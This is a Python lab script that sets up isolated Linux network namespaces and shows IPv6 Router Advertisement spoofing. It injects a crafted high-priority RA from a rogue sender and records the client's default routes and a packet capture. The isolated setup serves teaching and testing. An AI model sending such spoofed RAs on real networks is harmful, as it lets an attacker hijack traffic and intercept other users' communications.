#!/usr/bin/env python3
"""Isolated RA priority demonstration. Requires sudo, iproute2, tcpdump, Scapy."""
import argparse
import subprocess
import sys
import time
from pathlib import Path

PREFIX = "l6spoof"
PORT_PREFIX = "sp"
ROLES = {"router": ("sp-rh", "r0"), "client": ("sp-ch", "c0"), "sender": ("sp-sh", "s0")}
BRIDGE = "l6spbr"


def cmd(*args, check=True, capture=False):
    return subprocess.run(args, check=check, text=True,
                          stdout=subprocess.PIPE if capture else None,
                          stderr=subprocess.STDOUT if capture else None)


def ip(*args, **kw):
    return cmd("ip", *args, **kw)


def cleanup():
    for role in ROLES:
        subprocess.run(["ip", "netns", "del", f"{PREFIX}-{role}"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
    subprocess.run(["ip", "link", "del", BRIDGE],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
    for host, _ in ROLES.values():
        subprocess.run(["ip", "link", "del", host],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)


def main():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--out", default=str(Path.home() / "lab06-ra-spoof"))
    p.add_argument("--cleanup", action="store_true")
    a = p.parse_args()
    if a.cleanup:
        cleanup()
        return
    if not (sys.platform.startswith("linux") and __import__("os").geteuid() == 0):
        raise SystemExit("Run from WSL/Linux with sudo.")
    try:
        import scapy.all as sc
    except ImportError:
        raise SystemExit("Install Scapy with: sudo apt install python3-scapy")
    cleanup()
    ip("link", "add", BRIDGE, "type", "bridge")
    ip("link", "set", BRIDGE, "up")
    for role in ROLES:
        ip("netns", "add", f"{PREFIX}-{role}")
        ip("-n", f"{PREFIX}-{role}", "link", "set", "lo", "up")
    for role, (host, inside) in ROLES.items():
        ip("link", "add", host, "type", "veth", "peer", "name", inside)
        ip("link", "set", inside, "netns", f"{PREFIX}-{role}")
        ip("link", "set", host, "master", BRIDGE)
        ip("link", "set", host, "up")
        ip("-n", f"{PREFIX}-{role}", "link", "set", inside, "up")
    ip("-n", f"{PREFIX}-router", "-6", "addr", "add", "2001:db8:6::1/64", "dev", "r0")
    ip("-n", f"{PREFIX}-router", "-6", "addr", "add", "fe80::1/64", "dev", "r0", "nodad")
    ip("-n", f"{PREFIX}-sender", "-6", "addr", "add", "fe80::dead:beef/64", "dev", "s0", "nodad")
    ip("netns", "exec", f"{PREFIX}-client", "sysctl", "-qw",
       "net.ipv6.conf.c0.accept_ra=2", "net.ipv6.conf.c0.autoconf=1",
       "net.ipv6.conf.c0.disable_ipv6=0")
    out = Path(a.out); out.mkdir(parents=True, exist_ok=True)
    capture = subprocess.Popen(["tcpdump", "-U", "-i", "sp-ch", "-w",
                                str(out / "ra-spoof.pcap"), "icmp6"],
                               stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
                               text=True)
    time.sleep(1)
    if capture.poll() is not None:
        error = capture.stderr.read().strip()
        raise SystemExit(f"tcpdump failed on sp-ch: {error}")
    for _ in range(30):
        ll = ip("netns", "exec", f"{PREFIX}-client", "ip", "-6", "addr",
                "show", "dev", "c0", capture=True).stdout
        if "fe80::" in ll:
            break
        time.sleep(0.2)
    else:
        raise SystemExit("Client link-local address did not become ready.")
    legit = sc.Ether(src="02:00:00:00:06:01", dst="33:33:00:00:00:01") / sc.IPv6(
        src="fe80::1", dst="ff02::1", hlim=255) / sc.ICMPv6ND_RA(
        routerlifetime=1800, prf=0) / sc.ICMPv6NDOptPrefixInfo(
        prefix="2001:db8:6::", prefixlen=64, L=1, A=1,
        validlifetime=3600, preferredlifetime=1800) / sc.ICMPv6NDOptSrcLLAddr(lladdr="02:00:00:00:06:01")
    for _ in range(3):
        sc.sendp(legit, iface="sp-rh", verbose=False)
        time.sleep(1)
    baseline = ip("netns", "exec", f"{PREFIX}-client", "ip", "-6", "route",
                  "show", "default", capture=True).stdout
    (out / "baseline-route.txt").write_text(baseline)
    print("Client route after legitimate router RA:")
    print(baseline or "(none observed)")
    fake = sc.Ether(src="02:aa:bb:cc:dd:ee", dst="33:33:00:00:00:01") / sc.IPv6(
        src="fe80::dead:beef", dst="ff02::1", hlim=255) / sc.ICMPv6ND_RA(
        routerlifetime=900, prf=1) / sc.ICMPv6NDOptPrefixInfo(
        prefix="2001:db8:6::", prefixlen=64, L=1, A=1,
        validlifetime=3600, preferredlifetime=1800) / sc.ICMPv6NDOptSrcLLAddr(lladdr="02:aa:bb:cc:dd:ee")
    sc.sendp(fake, iface="sp-sh", verbose=False)
    time.sleep(3)
    capture.terminate()
    capture.wait(timeout=5)
    capture.stderr.close()
    route = ip("netns", "exec", f"{PREFIX}-client", "ip", "-6", "route",
               "show", "default", capture=True).stdout
    (out / "client-default-routes.txt").write_text(route)
    print("Injected one crafted RA on the isolated bridge. Client default routes:")
    print(route or "(none observed)")
    print(f"PCAP: {out / 'ra-spoof.pcap'}")
    print("Cleanup: sudo python3 ra_spoof_lab.py --cleanup")


if __name__ == "__main__":
    main()
